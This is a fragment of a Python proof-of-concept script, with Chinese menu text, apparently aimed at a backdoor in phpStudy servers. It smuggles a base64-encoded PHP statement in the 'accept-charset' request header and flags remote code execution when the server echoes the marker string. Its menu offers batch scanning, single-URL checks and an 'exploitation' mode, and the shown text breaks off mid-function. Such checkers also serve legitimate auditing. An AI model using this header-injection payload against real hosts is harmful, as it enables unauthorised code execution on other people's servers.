...
headers = {
    ...
    'Sec-Fetch-Site': 'none',
    'accept-charset': 'ZXhpdCgnZXhpdCBiYWNrZG9vcicpOw==',
...
def check(url):
    ...
    try:
        ...
        if result.status_code == 200 and 'exit backdoor' in result.text:
            print("[+] Remote code execution vulnerability exists at the "+url)
            return True
        else:
            print("[-] There is no remote code execution vulnerability in the "+url)
            return False
    except Exception as e:
        print(e)
        print('连接出错'+url)
if __name__ == '__main__':
    print("1：批量检测，请将要检查的url存放于url.txt中。\n2:单个url检测。\n3:漏洞利用。")
    try:
